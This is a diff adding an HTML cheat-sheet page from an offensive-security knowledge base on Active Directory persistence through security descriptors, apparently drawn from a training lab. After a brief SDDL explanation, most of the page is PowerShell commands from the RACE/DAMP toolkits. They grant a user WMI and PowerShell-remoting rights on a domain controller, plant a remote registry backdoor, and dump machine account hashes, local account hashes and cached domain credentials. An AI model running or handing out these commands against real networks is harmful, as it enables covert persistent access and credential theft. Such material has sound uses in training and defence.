@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3> PERSISTENCE - SECURITY DESCRIPTORS </h3>
+
+>> Security Descriptor Definition Language defines the format which is used to describe a security descriptor. 
+SDDL uses ACE strings for DACL and SACL:
+
+ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+
+>> ACE for built-in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;SID
+
+<b>::: USING WMI</b>
+
+Using the RACE toolkit
+
+<b> IMPORT THE MODULE</b>
+
+. C:\AD\Tools\RACE-master\RACE.ps1
+
+<b> ON LOCAL MACHINE FOR student1</b>
+
+PS> Set-RemoteWMI -SamAccountName student1 -Verbose
+
+<b> ON REMOTE MACHINE FOR student1 WITHOUT EXPLICIT CREDENTIALS</b>
+
+PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
+
+<b> ON REMOTE MACHINE WITH EXPLICIT CREDENTIALS. ONLY root\cimv2 AND NESTED NAMESPACES</b>
+
+PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator –namespace 'root\cimv2' -Verbose
+
+<b> ON REMOTE MACHINE REMOVE PERMISSIONS</b>
+
+PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Remove -Verbose
+
+<b>::: USING POWERSHELL REMOTING</b>
+
+<b> ON LOCAL MACHINE FOR student1</b>
+
+PS> Set-RemotePSRemoting -SamAccountName student1 -Verbose
+
+<b> ON REMOTE MACHINE FOR student1 WITHOUT CREDENTIALS</b>
+
+PS> Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
+
+<b> ON REMOTE MACHINE, REMOVE THE PERMISSIONS</b>
+
+PS> Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
+
+<b>::: USING REMOTE REGISTRY</b>
+
+<b> USING RACE or DAMP, WITH ADMIN PRIVSON REMOTE MACHINE</b>
+
+PS> Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+
+<b> AS student1, RETRIEVE MACHINE ACCOUNT HASH</b>
+
+PS> Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+
+<b> RETRIEVE LOCAL ACCOUNT HASH</b>
+
+PS> Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+
+<b> RETRIEVE DOMAIN CACHED CREDENTIALS</b>
+
+PS> Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+
+</center>
+</body>
+</html>
